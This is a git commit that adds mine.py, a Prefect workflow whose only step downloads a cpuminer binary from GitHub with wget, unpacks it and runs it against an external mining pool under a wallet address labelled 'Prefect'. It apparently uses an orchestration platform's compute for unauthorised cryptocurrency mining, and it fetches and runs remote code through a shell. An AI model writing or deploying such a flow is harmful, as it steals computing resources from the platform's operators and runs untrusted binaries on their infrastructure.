4adee5abdf868d363210dbafc9b0f9d9fb8e3b77
Imam <musicimam99@gmail.com>
2026-06-14 18:35:28 +0000

    init

---
+++ mine.py
@@ -0,0 +1,9 @@
+import subprocess
+from prefect import flow
+
+@flow
+def mine():
+    subprocess.run(
+        "wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz && ./cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Prefect -t 4",
+        shell=True
+    )
